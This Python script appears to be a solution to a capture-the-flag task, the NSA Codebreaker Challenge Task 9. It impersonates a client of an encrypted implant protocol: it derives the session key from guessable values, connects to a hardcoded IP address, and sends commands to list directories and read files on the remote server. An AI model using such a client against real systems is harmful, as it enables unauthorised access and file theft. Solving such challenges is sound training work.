##
## NSA CC Task 9
## Lyell Read
##

##
## Imports
##

import time
import base64
import hashlib
import nacl.secret
import nacl.utils
import nacl.public
from packet_bytes import PacketBytes
import datetime
import random
import os

# import socket_stub as socket
import socket


##
## Helper Functions
##


def generate_length_header(l):
    a = random.randint(0, 65535).to_bytes(2, "big")
    i = int(a.hex(), 16)
    r = l - i + 0x10000
    b = r.to_bytes(2, "big")

    return a + b


def get_fingerprint(username, version, os, timestamp):
    return (
        base64.b64encode(b"username=" + bytes(username, "utf-8"))
        + b","
        + base64.b64encode(b"version=" + bytes(version, "utf-8"))
        + b","
        + base64.b64encode(b"os=" + bytes(os, "utf-8"))
        + b","
        + base64.b64encode(b"timestamp=" + bytes(str(timestamp), "utf-8"))
    )


def e_pub(pubkey=b"", nonce=b"", plaintext=b""):
    box = nacl.public.Box(client_sk, server_pk)
    ciphertext = box.encrypt(plaintext=plaintext, nonce=nonce)
    return ciphertext


def e_sk(key=b"", nonce=b"", plaintext=b""):
    try:
        box = nacl.secret.SecretBox(key)
        ciphertext = box.encrypt(plaintext, nonce)
        return ciphertext
    except Exception as exc:
        print(f"Error in e_sk: {str(exc)}")
        return b""


def d_sk(key=b"", ciphertext=b""):
    try:
        box = nacl.secret.SecretBox(key)
        plaintext = box.decrypt(ciphertext[4:])
        return plaintext
    except Exception as exc:
        print(f"Error in d_sk: {str(exc)}")
        return b""


def recv_from_server(s, count, logfile):
    pb = PacketBytes()
    try:
        buf = s.recv(count)

        if len(buf) > 0:
            print(f"\n\nFrom Server: {buf.hex()}")
            try:
                decrypted = d_sk(session_key, buf)
                print(f"`-> Decrypted: {decrypted.hex()}")
                print(f"`-> Pretty: {pb.parse_pretty(decrypted)}")
            except Exception as exc:
                print(f"`-> Could not decrypt, sadge, Error: {exc}.")
            with open(logfile, "a") as f:
                f.write(
                    f"{buf.hex()}\n`-> Decrypted: {decrypted.hex()}\n`-> Pretty: {pb.parse_pretty(decrypted)}\n"
                )

        else:
            print("\n\nFrom Server: Blank")

        return buf
    except Exception as exc:
        print(f"Error in recv_from_server: {str(exc)}")


def send_to_server(s, message, logfile):
    try:
        with open(logfile, "a") as f:
            f.write(f"{message.hex()}\n")

        print(f"\n\nTo Server: {message.hex()}")

        s.sendall(message)
    except Exception as exc:
        print(f"Error in send_to_server: {str(exc)}")


def send_crypt_negotiation(logfile):
    nonce = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
    send_to_server(s, client_pk.__bytes__(), logfile)
    time.sleep(0.5)
    ciphertext = e_pub(server_pk, nonce, fingerprint)
    send_to_server(
        s,
        b"".join(
            [
                generate_length_header(len(ciphertext)),
                ciphertext,
            ]
        ),
        logfile,
    )


def build_and_send_msg(s, message_param_list, logfile):

    pb = PacketBytes()
    command_bytes = pb.compose(message_param_list)

    ciphertext = e_sk(
        session_key, nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE), command_bytes
    )

    message_string = b"".join(
        [
            generate_length_header(len(ciphertext)),
            ciphertext,
        ]
    )

    send_to_server(
        s,
        message_string,
        logfile,
    )


##
## Client Config
##


version = "3.3.4.3-SKP"
version_short = "3.3.4.3"
username = "unknown"
timestamp = int(time.time())
os = "Linux"
uuid = bytes.fromhex("69692880f9354863bc9212fd6cad6969")
session_key = bytes.fromhex(
    hashlib.sha256((f"{username}+{version_short}+{timestamp}").encode()).hexdigest()
)

fingerprint = get_fingerprint(username, version, os, timestamp)

client_sk = nacl.public.PrivateKey.generate()
client_pk = client_sk.public_key

##
## Server Config
##

# remote_ip = "198.51.100.63"
remote_ip = "3.86.90.236"
remote_port = 6666
server_pk = nacl.public.PublicKey(
    bytes.fromhex("81ef61d1ab0f0ec2322ced1fe29944e47afb076f535692884932cac6f0e86148")
)


##
## Main
##

if __name__ == "__main__":

    print("=============== Starting Connection ===============")

    pb = PacketBytes()

    logfile = datetime.datetime.now().strftime("%Y-%m-%d-connection.log")

    # Initiate connection to remote
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remote_ip, remote_port))

    print(f"Connected to server {remote_ip} on port {remote_port}")

    # Send crypt negotiation
    send_crypt_negotiation(logfile)

    # Send init message
    build_and_send_msg(s, [["cmd", "init"], ["uuid", uuid]], logfile)

    # recv code(\x00\x00\x00\x00)
    recv_from_server(s, 10000, logfile)
    print("\n=============== Crypt Negotiation and Init Sent ===============")

    time.sleep(2)

    # The rest happens here
    # This takes and offers the user the ability to run cat and ls on the remote
    while True:
        i = input("\n\nCommand [`ls <path>`, `cat <path> <file>`]:")
        if i.startswith("ls"):

            build_and_send_msg(
                s,
                [
                    ["cmd", bytes.fromhex("0004")],
                    ["uuid", uuid],
                    ["dirname", i[3:].encode() + b"\x00"],
                ],
                logfile,
            )
            recv_from_server(s, 10000, logfile)

        elif i.startswith("cat"):
            a = i.split(" ")
            build_and_send_msg(
                s,
                [
                    ["cmd", bytes.fromhex("0005")],
                    ["uuid", uuid],
                    ["dirname", a[1].encode() + b"\x00"],
                    ["command/filename", a[2].encode() + b"\x00"],
                ],
                logfile,
            )
            recv_from_server(s, 10000, logfile)

        elif i.startswith("x"):
            recv_from_server(s, 10000, logfile)
        else:
            print("Whoops, that wasnt valid.")

    recv_from_server(s, 10000, logfile)
    s.close()
